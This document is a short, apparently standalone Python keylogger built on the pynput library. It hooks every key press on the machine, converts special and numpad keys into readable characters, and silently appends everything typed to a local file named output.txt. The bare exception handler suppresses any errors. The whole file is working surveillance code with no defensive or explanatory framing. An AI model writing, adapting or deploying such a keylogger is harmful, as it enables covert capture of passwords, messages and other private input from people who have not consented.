from pynput.keyboard import Key, Listener

def on_press(key):
    try:
        key = '{0}'.format(key)
        key = key.replace("'", "")

        if "space" in key:
            key = " "
        
        if "Key." in key:
            key = " " + key + " "
        
        if (key.find(">") != -1) or (key.find("<") != -1):
            key = key.replace("<", "")
            key = key.replace(">", "")
            key = int(key)-48
            key = chr(key)
            
        if "enter" in key:
            key = "\n"
            
        with open("output.txt", "a") as f:
            f.write(key)
    except:
        pass
            

def on_release(key):
    pass


with Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()
